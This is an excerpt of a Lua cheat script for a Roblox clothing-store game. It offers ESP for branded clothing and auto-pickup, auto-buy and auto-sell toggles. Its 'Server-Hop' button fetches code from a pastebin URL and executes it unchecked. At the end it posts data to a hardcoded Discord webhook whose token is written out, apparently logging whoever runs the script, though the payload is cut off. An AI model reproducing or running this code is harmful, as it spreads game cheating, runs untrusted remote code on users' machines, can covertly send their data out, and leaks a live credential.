...
local Misc = Tabs.Home:AddLeftGroupbox('Misc')
local home = Tabs.Home:AddRightGroupbox('Shops')
...
Options.MyDropdown:OnChanged(function()
    PickMode = Options.MyDropdown.Value
    print(PickMode)
end)

Misc:AddToggle('Pickup', {
    Text = 'Auto PickUp',
    Default = false
...
Misc:AddToggle('Max', {
    Text = 'PickUp Max Distance',
    Default = false

})

Misc:AddToggle('InstGrab', {
    Text = 'Instance Grab',
    Default = false

})

Misc:AddToggle('AutoGrab', {
    Text = 'Auto Grab',
    Default = false

})

Misc:AddToggle('AutoBuy', {
    Text = 'Auto Buy',
    Default = false

})

Misc:AddToggle('AutoSell', {
    Text = 'Auto Sell',
    Default = false

})

local MyButton = Misc:AddButton('Server-Hop', function()
    loadstring(game:HttpGet("https://pastebin.com/raw/LNxGXjkG"))()
end)

Misc:AddToggle('DropEsp', {
    Text = 'Droped Clotch Esp',
    Default = false
...
home:AddToggle('SportM', {
    Text = 'SportMaster Esp',
    Default = false
...
home:AddToggle('Chrome', {
    Text = 'CromeHeart Esp',
    Default = false

})
home:AddToggle('Stone', {
    Text = 'StoneIsland Esp',
    Default = false
...
home:AddToggle('Balenc', {
    Text = 'Balenciaga Esp',
    Default = false

})
home:AddToggle('Louisviton', {
    Text = 'LouisVuitton Esp',
    Default = false

})
home:AddToggle('Gucci', {
    Text = 'Gucci Esp',
    Default = false

})
home:AddToggle('Exclus', {
    Text = 'Exclusive Clotches Esp',
    Default = false
...
Toggles.SportM:OnChanged(function(Value)
    if Value then
        _G.SportMast = true
...
Toggles.Bape:OnChanged(function(Value)
    if Value then
        _G.Bape = true
...
Toggles.Chrome:OnChanged(function(Value)
    if Value then
        _G.ChromeH = true
...
Toggles.Stone:OnChanged(function(Value)
    if Value then
        _G.StoneIsland = true
...
Toggles.Zara:OnChanged(function(Value)
    if Value then
        _G.Zara = true
...
Toggles.Louisviton:OnChanged(function(Value)
    if Value then
        _G.LouisV = true
...
Toggles.Gucci:OnChanged(function(Value)
    if Value then
        _G.Gucci = true
...
Toggles.Exclus:OnChanged(function(Value)
if Value then
    _G.Exclus = true
    while _G.Exclus == true do
       ...
       for i,v in pairs(workspace.World.Debris:FindFirstChild("Stores"):GetDescendants()) do
            if v:FindFirstChild("Clothing") then 
                if table.find(ExclusiveList,v.Clothing.Template.Texture) then
...
Toggles.DropEsp:OnChanged(function(Value)
    if Value then
        _G.DropedEsp = true
...
Toggles.AutoBuy:OnChanged(function(Value)
    if Value then
        _G.AutoSell = true
...
Toggles.AutoGrab:OnChanged(function(Value)
    if Value then
        _G.AutoGrab = true
...
Toggles.InstGrab:OnChanged(function(Value)
    if Value then
        _G.InstBuy = true
...
Toggles.Max:OnChanged(function(Value)
     if Value then
        _G.MaxActiv = true
...
Toggles.Pickup:OnChanged(function(Value)
    if Value then
        _G.AutoPick = true
...
Library:SetWatermark('You Stupid Bro?')
...
local success, response = pcall(function()
    ...
    local url =
        "https://discord.com/api/webhooks/1129493511117484064/9MJhEBI9UvKQRgOS0HqdKYFKk6xzhvSvcBeKPeXbKkIc8Er8Ah6BwZxfzulYw26-6q6m"
    local data = {
        ["content"] = ".",
        ["embeds"] = {
            {
